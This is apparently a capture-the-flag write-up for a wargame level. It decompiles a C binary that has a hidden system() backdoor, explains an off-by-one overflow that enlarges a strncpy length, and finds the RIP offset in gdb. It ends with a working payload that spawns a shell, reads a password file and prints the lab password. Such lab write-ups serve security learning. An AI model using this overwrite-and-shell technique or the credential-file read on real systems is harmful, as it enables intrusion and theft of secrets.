typedef struct s_message
{
    char text[140];
    char username[40];
    int len;
} t_message;

void secret_backdoor() {
    char buffer[128];

    fgets(buffer, 128, stdin);
    system(buffer);
}

void set_msg(t_message *message) {
    char local_buffer[0x400]; // 1024

    memset(local_buffer, '\0', 0x400); // 128

    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(local_buffer, 0x400, stdin);
    strncpy(message->text, local_buffer, message->len); // 0x8c ; 140
}

void set_username(t_message *message) {
    int32_t i;
    char local_buffer[0x80]; // 128
    
    memset(local_buffer, 0, 0x80); // 128

    puts(">: Enter your username");
    printf(">>: ");
    fgets(local_buffer, 0x80, stdin); // 128

    *(int32_t *)(local_buffer + 140) = 0;

    for (i = 0; i <= 0x28 && local_buffer[i]; i++) {
        message->username[i] = local_buffer[i];
    }

    printf(">: Welcome, %s", message->username);
}

void handle_msg() {
    t_message message;

    memset(message.username, 0, 0x28); // 40
    message.len = 0x8c; // 140

    set_username(&message);
    set_msg(&message);

    puts(">: Msg sent!");
}

int main() {
    puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    handle_msg();
    return 0;
}

the program ask for an username and a message with fgets and store them inside t_message struct.

we can see inside set_username that the loop that copy the given username inside t_message.username copy 41 bytes instead of 40. So we can overflow it, because its in a struct we know it will overflow inside the first byte of t_message.len. And t_message.len is used as len for strncpy inside set_msg hopefully if we set an high enought len we can overflow t_message.text on the rip(not eip cause we are in a 64bytes prog).

finding the rip offset from t_message.text

so we need to use the username overflow to have a larger len and we gonna use buffer overflow pattern generator to find the offset

(gdb) r < <(python -c 'print "a" * 40 + "\xff"'; cat)
Starting program: /home/users/level09/level09 < <(python -c 'print "a" * 40 + "\xff"'; cat)
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5c8:
 rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
 called by frame at 0x7fffffffe5d8
 Arglist at 0x6741356741346741, args:
 Locals at 0x6741356741346741, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rip at 0x7fffffffe5c8

so with the saved rip (0x4138674137674136) we know our buffer is 200

then we can build our exploit where we will overid rip with secret_backdoor addr.
our program is build in PIE so to find the secret_backdoor addr we need to run the program with gdb then we can check the address (cause if we dont run program we only get relative addr)

level09@OverRide:~$ gdb ./level09
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09
Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function
All defined functions:
...
0x000055555555488c  secret_backdoor
...

level09@OverRide:~$ (python -c 'print "a" * 40 + "\xff"'; python -c 'print "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
